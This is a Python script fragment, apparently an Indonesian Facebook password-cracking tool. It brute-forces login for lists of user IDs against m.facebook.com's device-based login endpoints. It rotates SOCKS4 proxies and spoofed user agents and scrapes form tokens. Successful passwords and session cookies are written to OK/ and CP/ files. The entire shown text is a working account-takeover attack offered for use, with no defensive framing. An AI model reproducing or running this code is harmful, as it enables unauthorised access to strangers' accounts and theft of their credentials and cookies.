			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'├──THNS CP ID  : {kk}{idf}{P} \n│   └──  THNS CP PASS  : {kk}{pw}{P}\n└── User Agent  : {kk}{ua}{P} ')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'├── RODAN OK ID  : {hh}{idf}{P} \n│   └── RODAN OK PASS  : {hh}{pw} {P}\n└──  CookieS : {hh}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1
def crackfree(idf,pwv):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write(f"\r (KALI-LINUX) {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'[+]ID : {kk}{idf}{P} \n[+]PASSWORD : {kk}{pw}{P}\n[+]COOKIE  : {kk}{P} ')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'[+]ID : {hh}{idf}{P} \n[+]PASSWORD : {hh}{pw} {P}\n[+]COOKIE : {hh}{kuki}{P}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				
				
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(3)
	loop+=1

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.system('clear')
	except:pass
	login()
